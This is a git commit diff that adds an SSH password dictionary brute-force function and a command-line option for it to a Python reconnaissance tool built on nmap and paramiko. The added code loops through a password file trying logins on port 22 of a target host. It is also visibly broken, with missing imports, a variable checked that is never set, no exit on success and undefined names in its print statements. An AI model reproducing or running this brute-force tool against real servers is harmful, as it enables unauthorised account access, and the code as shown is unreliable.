68679fa4643eac04efefe1fa205b1730df6cb31b
rephric <zjestrella1@gmail.com>
2018-08-12 22:02:49 -0400

    Added port 22 Bruteforce Dictionary attack

--- tools.py
+++ tools.py
@@ -2,6 +2,7 @@ import click
 import nmap
 import json
 import xmltodict
+import paramiko
 
 def nmapScan(tgthost, tgtport, js):
     try:
@@ -22,6 +23,32 @@ def nmapScan(tgthost, tgtport, js):
         with open('nmap_output.xml', 'a+') as outfile:
             json.dump(xml, outfile)
 
+
+def dictionAttck(tgthost, user, f):
+    if not os.path.exists(f):
+        print "\n[*] File Path Does Not Exist!"
+        sys.exit(4)
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    input_file = open(f)
+    for i in input_file.readlines():
+        password = i.strip("\n")
+        try:
+            code = 0
+            response = ssh.connect(tgthost, port=22, username=user, password=password)
+        except paramiko.AuthenticationException:
+            code = 1
+        except socket.error, e:
+            code = 2
+        ssh.close()
+    if response == 0:
+        print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
+        sys.exit(0)
+    if response == 1:
+        print("%s[*] User: %s [*] Pass: %s => Login Incorrect!" % (username, password))
+    if response == 2:
+        print("[*] Connection Could Not Be Established To Address: %s" % (host))
+        sys.exit(2)
 
 @click.group()
 @click.pass_context
@@ -52,13 +79,19 @@ def recon(self, nmap, tgthost, tgtport, js):
                     nmapScan(tgthost,tgtport,js)
 
 
-#@main.command()
-#@click.option('')
-def bf(self):
+@main.command()
+@click.option('--tgthost', '-h', type=str, help='Target host')
+@click.option('--user', '-u', type=str, help='Target SSH username')
+@click.option('--diction', '-d', is_flag=True, help='Runs a dictionary attack on a host via SSH')
+@click.option('-f', type=str, help='Password list file directory')
+def bf(self, tgthost, user, diction, f):
     """
     Different Bruteforce mechanisms.
     * Dictionary Attack
     """
+    if diction:
+        dictionAttck(tgthost, user, f)
+
 
 if __name__ == '__main__':
     main()
